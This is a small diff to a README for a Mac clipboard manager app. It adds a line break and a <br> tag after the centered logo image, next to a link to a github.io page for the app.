@@ -2,7 +2,9 @@
 
 <div align="center">  
 <img src="https://cdn.mos.cms.futurecdn.net/qjiBjycvXENbGY7bTufoJ7.png" alt="Mac Clipboard Manager Logo" width="600">  
-</div>  
+</div>
+
+<br>
 
 <div align="center">  
 <a href="https://macos-25.github.io/.github/clipboardmac">  
